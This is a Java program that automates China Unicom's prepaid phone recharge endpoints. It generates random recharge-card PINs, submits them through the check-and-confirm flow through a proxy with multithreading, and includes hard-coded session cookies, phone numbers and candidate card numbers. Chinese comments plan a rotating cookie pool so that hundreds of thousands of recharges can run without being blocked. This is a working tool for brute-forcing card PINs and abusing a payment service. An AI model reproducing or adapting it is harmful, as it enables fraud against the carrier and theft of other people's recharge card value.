package com.kane.practice.program.ltcard;

import com.alibaba.fastjson.JSONObject;
import com.google.common.util.concurrent.RateLimiter;
import com.kane.practice.utils.http.HttpClientUtil;
import com.kane.practice.utils.http.HttpPoolClient;
import com.kane.practice.utils.http.ProxyInfo;
import com.kane.practice.utils.http.SupplyResult;
import net.dongliu.requests.RawResponse;
import net.dongliu.requests.Requests;
import org.apache.commons.lang3.RandomUtils;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * <dependency>
 * <groupId>net.dongliu</groupId>
 * <artifactId>requests</artifactId>
 * <version>4.18.2</version>
 * </dependency>
 *
 * <dependency>
 * <groupId>org.jsoup</groupId>
 * <artifactId>jsoup</artifactId>
 * <version>1.7.2</version>
 * </dependency>
 */
public class LtCard {
    private static RateLimiter rateLimiter = RateLimiter.create(10);

    private static RateLimiter rateLimiterDeal = RateLimiter.create(10);

    public static void main(String[] args) {

        ExecutorService executorService = Executors.newFixedThreadPool(50);
        int[] ints = new int[]{0};
        //这四个是昨天搞出来的可用cookie，充值几百单后变成不可用，今天又都可用了，切换网络后依旧有效
        //本来想把这些cookie变成不可用，再过一段时间看下是否会变成可用，结果几个cookie各充值了1万多笔，还是都可用。。。
        //若是原本可用的cookie变不可用后，雪藏一段时间后又会变成可用且耐用，那搞个cookie池，循环利用，若有20个，一次循环就能充值20万单以上
        //方式可行简单，也不需要代理啥的，巨大缺陷是，cookie可用性无法控制，若忽然都不可用了，会导致充值通道直接关停
        //前期可手动搞些cookie，若是确实可行，后续再研究下如何自动补充可用cookie
//        String cookies = "upay_user=bf06ef5e8b0dc52baebdbd4495b1bed4";
//        String cookies = "upay_user=bcd50ed7928c281769694e5de9c5fc93";
//        String cookies = "upay_user=e793683f03d6bbff6d88858a243b6a27";
//        String cookies = "upay_user=dc95511c44f4a602579e868deeec3fd1"; //可用
        Long phoneNo = 17643539666L;
        phoneNo = 13067849980L;

//        final  ProxyInfo proxyInfo = null;

        final ProxyInfo proxyInfo = new ProxyInfo();
        proxyInfo.setProxyHost("106.35.174.205");
        proxyInfo.setProxyPort(4267);

        for (int i = 0; i < 1; i++) {
            String phone = String.valueOf(phoneNo );
            String clientKey = String.valueOf(i);
            String finalCardPwd = getCard();

            rateLimiter.acquire();

            executorService.execute(() -> {
                rateLimiterDeal.acquire();

                synchronized (LtCard.class) {
                    System.out.println("计数：" + ints[0]++);
                }


                //cookie可用性校验
//                String needCodeUrl = "http://upay.10010.com/npfwap/NpfMob/needCode?channelType=307&_=1597371846764";
//                Map<String, String> needCodeHeader = new HashMap<>();
//                needCodeHeader.put("Accept", "text/plain, */*; q=0.01");
//                needCodeHeader.put("Accept-Language", "zh-cn");
//                needCodeHeader.put("Host", "upay.10010.com");
//                needCodeHeader.put("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15");
//                needCodeHeader.put("Referer", "https://upay.10010.com/npfweb/npfcellweb/phone_recharge_fill.htm");
//                needCodeHeader.put("Accept-Encoding", "br, gzip, deflate");
//                needCodeHeader.put("Connection", "keep-alive");
//                needCodeHeader.put("X-Requested-With", "XMLHttpRequest");
//                RawResponse needCodeSend = Requests.get(needCodeUrl).headers(needCodeHeader).socksTimeout(15000).send();
//                if (needCodeSend.getStatusCode() != 200) {
//                    System.out.println("cookie可用性校验请求异常：" + needCodeSend.getStatusCode());
//                    return;
//                }
//                String s = needCodeSend.readToText();
//                if (Objects.equals(s, "yes\n")) {
//                    //todo cookie不可用了
//                    System.out.println("cookie已失效");
//                    return;
//                }

                //充值校验请求
                String reChargeCheckUrl = "http://upay.10010.com/npfwap/NpfMob/mobWapReCharge/wapRechargeCheck.action";
                Map<String, String> reChargeCheckParam = new HashMap<>();
                reChargeCheckParam.put("commonBean.phoneNo", phone);
                reChargeCheckParam.put("commonBean.areaCode", "");
                reChargeCheckParam.put("commonBean.provinceCode", "");
                reChargeCheckParam.put("commonBean.cityCode", "");
                reChargeCheckParam.put("commonBean.provinceName", "");
                reChargeCheckParam.put("commonBean.cityName", "");
                reChargeCheckParam.put("bussineTypeInput", "");
                reChargeCheckParam.put("numberType", "");

                reChargeCheckParam.put("commonBean.bussineType", "04");
                reChargeCheckParam.put("commonBean.channelType", "307");
                reChargeCheckParam.put("ticketNew", "ticket");
                reChargeCheckParam.put("commonBean.saleChannel", "null");
                reChargeCheckParam.put("commonBean.deviceId", "null");
                reChargeCheckParam.put("commonBean.model", "null");
                reChargeCheckParam.put("commonBean.vipCode", "null");
                reChargeCheckParam.put("sinoUnionShortAddr", "");
                reChargeCheckParam.put("rechargeBean.cardPwd", finalCardPwd);

                Map<String, String> reChargeCheckHeader = new HashMap<>();
                reChargeCheckHeader.put("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                reChargeCheckHeader.put("Accept", "application/json, text/javascript, */*; q=0.01");
                reChargeCheckHeader.put("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6");
                reChargeCheckHeader.put("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15");
                reChargeCheckHeader.put("Referer", "Referer: http://upay.10010.com/npfwap/npfMobWap/recharge/index.html?chargeWay=02m");
//                reChargeCheckHeader.put("Accept-Encoding", "br, gzip, deflate");
                reChargeCheckHeader.put("Connection", "keep-alive");
                reChargeCheckHeader.put("X-Requested-With", "XMLHttpRequest");

                SupplyResult<String> post = HttpPoolClient.INS.sendPostByCookieByHeader(reChargeCheckUrl, reChargeCheckParam, reChargeCheckHeader, clientKey, proxyInfo);
                if (!post.isSuccess()) {
                    System.out.println("充值校验请求异常：" + post);
                    System.err.println("count: " + ints[0]);
//                    System.exit(1);
                    return;
                }
                String readToText = post.getModule();
                System.out.println("充值校验响应：" + readToText);
                JSONObject jsonObject = JSONObject.parseObject(readToText);
                String out = jsonObject.getString("out");
                if (!Objects.equals(out, "success")) {
                    System.out.println("充值校验异常：" + phone + " " + out);
                    if ("繁忙".equals(out) || (out != null && out.contains("å¤ªé¢"))) {
                        System.err.println("count: " + ints[0]);
                        System.exit(1);
                    }
                    return;
                }
                String secstate = jsonObject.getString("secstate");

                //充值确认请求
                String reChargeConfirmUrl = "http://upay.10010.com/npfwap/NpfMob/mobWapReCharge/wapRechargeConfirm";
                Map<String, String> reChargeConfirmParam = new HashMap<>();
//                reChargeConfirmParam.put("bussineTypeInput", "0");
                reChargeConfirmParam.put("secstate.state", secstate);


                reChargeCheckHeader.put("Referer", "http://upay.10010.com/npfwap/NpfMob/mobWapReCharge/wapRechargeApplay.action");
                SupplyResult<String> charge = HttpPoolClient.INS.sendPostByCookieByHeader(reChargeConfirmUrl, reChargeConfirmParam, reChargeCheckHeader, clientKey, proxyInfo);
                if (!charge.isSuccess()) {
                    System.out.println("充值请求异常：" + charge.getModule());
                    return;
                }
                String body = charge.getModule();
                System.out.println("确认结果：" + body);
                Document parse = Jsoup.parse(body);
                Element inforFill = parse.getElementsByClass("errormessage").first();
                System.out.println("充值结果：" + inforFill.text());
                //todo 解析具体节点，判断充值成功还是失败
            });

        }
        executorService.shutdown();

    }

    private static String getCard() {
        String cardPwd = "980";
        for (int i = 0; i < 16; i++) {
            cardPwd = cardPwd + RandomUtils.nextLong(0, 9);
        }
//        cardPwd = "9807556233825165963";
//        cardPwd = "9806926400588750756";
//        cardPwd = "9806115043365086169";
//        cardPwd = "9801943964701017561";
//        cardPwd = "9807852471543586468";
        cardPwd = "9804649334418770808";
        System.out.println("card:" + cardPwd);
        return cardPwd;
    }
}
